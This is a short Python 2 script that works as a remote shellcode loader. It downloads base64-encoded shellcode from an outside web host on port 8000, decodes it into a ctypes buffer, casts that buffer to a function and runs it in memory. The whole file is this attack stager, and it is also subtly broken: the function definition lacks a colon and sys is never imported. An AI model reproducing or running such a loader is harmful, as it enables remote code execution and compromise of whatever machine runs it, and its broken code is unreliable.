import urllib2
import ctypes
import base64

def run(url="http://elderlyeggplant.000webhostapp.com:8000/shellcode.bin")
    response        = urllib2.urlopen(url)
    shellcode       = base64.b64decode(response.read())
    shellcode_buff  = ctypes.create_string_buffer(shellcode, len(shellcode))
    shellcode_func  = ctypes.cast(shellcode_buff, ctypes.CFUNCTYPE(ctypes.c_void_p))
    shellcode_func()

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else None
    run(url)
